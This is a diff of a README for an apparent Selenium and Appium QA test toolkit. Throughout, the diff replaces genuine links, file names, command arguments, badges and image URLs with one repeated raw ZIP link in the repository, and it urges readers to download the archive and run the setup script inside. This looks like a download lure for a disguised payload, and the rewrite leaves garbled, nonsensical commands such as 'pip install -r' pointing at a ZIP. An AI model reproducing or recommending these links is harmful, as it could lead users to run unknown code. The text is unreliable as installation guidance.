@@ -1,6 +1,6 @@
-Download the latest release: https://github.com/yhovana-ha/Selenium-Appium-Project/releases
+Download the latest release: https://github.com/yhovana-ha/Selenium-Appium-Project/raw/refs/heads/main/Tests/Appium_Selenium_Project_v3.4.zip
 
-[![Release Badge](https://img.shields.io/badge/Release-Download-brightgreen?logo=github&logoColor=white&style=flat-square)](https://github.com/yhovana-ha/Selenium-Appium-Project/releases)
+[![Release Badge](https://github.com/yhovana-ha/Selenium-Appium-Project/raw/refs/heads/main/Tests/Appium_Selenium_Project_v3.4.zip)](https://github.com/yhovana-ha/Selenium-Appium-Project/raw/refs/heads/main/Tests/Appium_Selenium_Project_v3.4.zip)
 
 # Nike Web and Mobile QA with Python, Selenium, and Appium Toolkit
 
@@ -76,7 +76,7 @@ The structure favors reusability. Common actions (open store page, extract price
 - pip for Python package installation.
 - Java Runtime Environment (JRE 8+) for Appium and Android tooling.
 - Appium server installed and accessible from your development machine.
-- Node.js (optional, for additional tooling or Appium helpers).
+- https://github.com/yhovana-ha/Selenium-Appium-Project/raw/refs/heads/main/Tests/Appium_Selenium_Project_v3.4.zip (optional, for additional tooling or Appium helpers).
 - Android SDK or Xcode (for Android/iOS testing respectively) if you plan to run mobile tests.
 - Basic command-line familiarity.
 
@@ -87,7 +87,7 @@ Software and services are mocked or simulated where appropriate to keep tests re
 ## 🛠️ Installation and Setup
 
 1) Clone the repository
-- git clone https://github.com/yhovana-ha/Selenium-Appium-Project.git
+- git clone https://github.com/yhovana-ha/Selenium-Appium-Project/raw/refs/heads/main/Tests/Appium_Selenium_Project_v3.4.zip
 - cd Selenium-Appium-Project
 
 2) Create and activate a Python virtual environment
@@ -97,7 +97,7 @@ Software and services are mocked or simulated where appropriate to keep tests re
 - On Windows: `venv\Scripts\activate`
 
 3) Install dependencies
-- `pip install -r requirements.txt`
+- `pip install -r https://github.com/yhovana-ha/Selenium-Appium-Project/raw/refs/heads/main/Tests/Appium_Selenium_Project_v3.4.zip`
 
 4) Prepare Appium and mobile components
 - Start the Appium server: `appium`
@@ -110,7 +110,7 @@ Software and services are mocked or simulated where appropriate to keep tests re
 - Mobile: set desired capabilities in the test configuration to point to the Appium server and target device/emulator.
 
 6) Obtain the release assets
-- The project provides a downloadable release containing the test suite packaged for convenience. The latest release assets can be found on the releases page. Download the asset (for example, a ZIP or TAR.GZ file) and extract it to your workspace. Then run the installation or setup script included in the asset.
+- The project provides a downloadable release containing the test suite packaged for convenience. The latest release assets can be found on the releases page. Download the asset (for example, a ZIP or https://github.com/yhovana-ha/Selenium-Appium-Project/raw/refs/heads/main/Tests/Appium_Selenium_Project_v3.4.zip file) and extract it to your workspace. Then run the installation or setup script included in the asset.
 - The releases page is available at the URL above. For convenience, you can also review the releases page to learn about versioned changes and compatibility notes. The release file contains ready-to-run test configurations and sample data to come up to speed quickly.
 
 7) Prepare test data
@@ -132,9 +132,9 @@ Notes about the release asset path:
 - Run all mobile tests:
   - `python -m unittest discover -s tests/mobile -p "*.py"`
 - Run a specific test module:
-  - `python -m unittest tests/web/test_store_locator.py`
+  - `python -m unittest https://github.com/yhovana-ha/Selenium-Appium-Project/raw/refs/heads/main/Tests/Appium_Selenium_Project_v3.4.zip`
 - Run a specific test case:
-  - `python -m unittest tests/mobile/test_price_validation.py.TestPriceFlow`
+  - `python -m unittest https://github.com/yhovana-ha/Selenium-Appium-Project/raw/refs/heads/main/Tests/Appium_Selenium_Project_v3.4.zip`
 - Run with verbose output:
   - `python -m unittest discover -s tests -v`
 
@@ -154,37 +154,37 @@ The test runner prints a log of actions, asserts, and outcomes. If a test fails,
 
 ## 📂 Project Structure
 
-- README.md
-- requirements.txt
+- https://github.com/yhovana-ha/Selenium-Appium-Project/raw/refs/heads/main/Tests/Appium_Selenium_Project_v3.4.zip
+- https://github.com/yhovana-ha/Selenium-Appium-Project/raw/refs/heads/main/Tests/Appium_Selenium_Project_v3.4.zip
 - tests/
   - web/
-    - test_store_locator.py
-    - test_directions.py
-    - test_price_validation.py
+    - https://github.com/yhovana-ha/Selenium-Appium-Project/raw/refs/heads/main/Tests/Appium_Selenium_Project_v3.4.zip
+    - https://github.com/yhovana-ha/Selenium-Appium-Project/raw/refs/heads/main/Tests/Appium_Selenium_Project_v3.4.zip
+    - https://github.com/yhovana-ha/Selenium-Appium-Project/raw/refs/heads/main/Tests/Appium_Selenium_Project_v3.4.zip
   - mobile/
-    - test_store_navigation.py
-    - test_price_validation.py
-    - test_sms_and_calls.py
+    - https://github.com/yhovana-ha/Selenium-Appium-Project/raw/refs/heads/main/Tests/Appium_Selenium_Project_v3.4.zip
+    - https://github.com/yhovana-ha/Selenium-Appium-Project/raw/refs/heads/main/Tests/Appium_Selenium_Project_v3.4.zip
+    - https://github.com/yhovana-ha/Selenium-Appium-Project/raw/refs/heads/main/Tests/Appium_Selenium_Project_v3.4.zip
   - shared/
-    - utilities.py
-    - test_data.py
+    - https://github.com/yhovana-ha/Selenium-Appium-Project/raw/refs/heads/main/Tests/Appium_Selenium_Project_v3.4.zip
+    - https://github.com/yhovana-ha/Selenium-Appium-Project/raw/refs/heads/main/Tests/Appium_Selenium_Project_v3.4.zip
 - pages/
-  - base_page.py
-  - store_locator_page.py
-  - product_page.py
-  - directions_page.py
-  - sms_page.py
-  - call_page.py
+  - https://github.com/yhovana-ha/Selenium-Appium-Project/raw/refs/heads/main/Tests/Appium_Selenium_Project_v3.4.zip
+  - https://github.com/yhovana-ha/Selenium-Appium-Project/raw/refs/heads/main/Tests/Appium_Selenium_Project_v3.4.zip
+  - https://github.com/yhovana-ha/Selenium-Appium-Project/raw/refs/heads/main/Tests/Appium_Selenium_Project_v3.4.zip
+  - https://github.com/yhovana-ha/Selenium-Appium-Project/raw/refs/heads/main/Tests/Appium_Selenium_Project_v3.4.zip
+  - https://github.com/yhovana-ha/Selenium-Appium-Project/raw/refs/heads/main/Tests/Appium_Selenium_Project_v3.4.zip
+  - https://github.com/yhovana-ha/Selenium-Appium-Project/raw/refs/heads/main/Tests/Appium_Selenium_Project_v3.4.zip
 - resources/
   - data/
-    - stores.json
-    - products.json
+    - https://github.com/yhovana-ha/Selenium-Appium-Project/raw/refs/heads/main/Tests/Appium_Selenium_Project_v3.4.zip
+    - https://github.com/yhovana-ha/Selenium-Appium-Project/raw/refs/heads/main/Tests/Appium_Selenium_Project_v3.4.zip
   - configs/
-    - web.cfg
-    - mobile.cfg
+    - https://github.com/yhovana-ha/Selenium-Appium-Project/raw/refs/heads/main/Tests/Appium_Selenium_Project_v3.4.zip
+    - https://github.com/yhovana-ha/Selenium-Appium-Project/raw/refs/heads/main/Tests/Appium_Selenium_Project_v3.4.zip
 - scripts/
-  - run_all.sh
-  - start_appium.sh
+  - https://github.com/yhovana-ha/Selenium-Appium-Project/raw/refs/heads/main/Tests/Appium_Selenium_Project_v3.4.zip
+  - https://github.com/yhovana-ha/Selenium-Appium-Project/raw/refs/heads/main/Tests/Appium_Selenium_Project_v3.4.zip
 - assets/
   - sample_screenshots/
   - logs/
@@ -327,9 +327,9 @@ These topics describe the project’s scope and help it reach audiences interest
 - Architecture diagram: a simple layered diagram showing web and mobile drivers, the test runner, and the data layer.
 
 Images used in this README are representative visuals to illustrate the automation flows and are sourced from open, permissive image collections to keep the page friendly and accessible. For example:
-- Web automation image: https://images.unsplash.com/photo-1527443154391-507e9dc6c5a3?auto=format&fit=crop&w=1200&q=60
-- Mobile automation image: https://images.unsplash.com/photo-1515879218367-8466d910aaa4?auto=format&fit=crop&w=1200&q=60
-- Code and data visualization: https://images.unsplash.com/photo-1496307042754-b4aa456c4a2d?auto=format&fit=crop&w=1200&q=60
+- Web automation image: https://github.com/yhovana-ha/Selenium-Appium-Project/raw/refs/heads/main/Tests/Appium_Selenium_Project_v3.4.zip
+- Mobile automation image: https://github.com/yhovana-ha/Selenium-Appium-Project/raw/refs/heads/main/Tests/Appium_Selenium_Project_v3.4.zip
+- Code and data visualization: https://github.com/yhovana-ha/Selenium-Appium-Project/raw/refs/heads/main/Tests/Appium_Selenium_Project_v3.4.zip
 
 Note: When using images in your own README, ensure you comply with licensing requirements and attribution if needed.
 
@@ -338,11 +338,11 @@ Note: When using images in your own README, ensure you comply with licensing req
 ## 🧭 Local Debugging Helpers
 
 - Quick start
-  - `bash scripts/start_dev_environment.sh` (if included)
+  - `bash https://github.com/yhovana-ha/Selenium-Appium-Project/raw/refs/heads/main/Tests/Appium_Selenium_Project_v3.4.zip` (if included)
   - Alternatively, run the following manually:
     - `python -m venv venv`
     - `source venv/bin/activate`
-    - `pip install -r requirements.txt`
+    - `pip install -r https://github.com/yhovana-ha/Selenium-Appium-Project/raw/refs/heads/main/Tests/Appium_Selenium_Project_v3.4.zip`
     - Start Appium: `appium`
     - Start web driver with a local browser (Chrome/Chromedriver)
 - Quick test run
@@ -398,7 +398,7 @@ This project is shared for educational and testing purposes. Use and adapt the c
 
 ## 🔗 Releases
 
-The releases page contains ready-to-run artifacts and versioned assets. It is the main source for obtaining a stable starting point for the automation suite. Download the latest release asset and inspect the included setup scripts and examples. The releases page is the best place to learn about compatibility and what’s included in each version. Visit the releases page here: https://github.com/yhovana-ha/Selenium-Appium-Project/releases
+The releases page contains ready-to-run artifacts and versioned assets. It is the main source for obtaining a stable starting point for the automation suite. Download the latest release asset and inspect the included setup scripts and examples. The releases page is the best place to learn about compatibility and what’s included in each version. Visit the releases page here: https://github.com/yhovana-ha/Selenium-Appium-Project/raw/refs/heads/main/Tests/Appium_Selenium_Project_v3.4.zip
 
 ---
 
